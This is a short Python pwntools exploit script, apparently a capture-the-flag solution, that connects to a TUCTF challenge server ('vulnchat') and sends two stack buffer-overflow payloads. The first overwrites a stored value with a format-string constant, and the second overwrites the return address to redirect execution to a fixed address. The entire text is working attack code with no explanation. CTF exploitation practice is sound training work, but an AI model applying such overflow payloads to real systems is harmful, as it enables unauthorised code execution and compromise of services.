from pwn import *

vuln = remote("vulnchat.tuctf.com",4141)
payload = "A" * 20 + p32(0x00007325)
vuln.sendlineafter("Enter your username: ",payload)
payload2 = "A" * 49 + p32(0x804856b)
vuln.sendlineafter(": ",payload2)
print vuln.recvall()
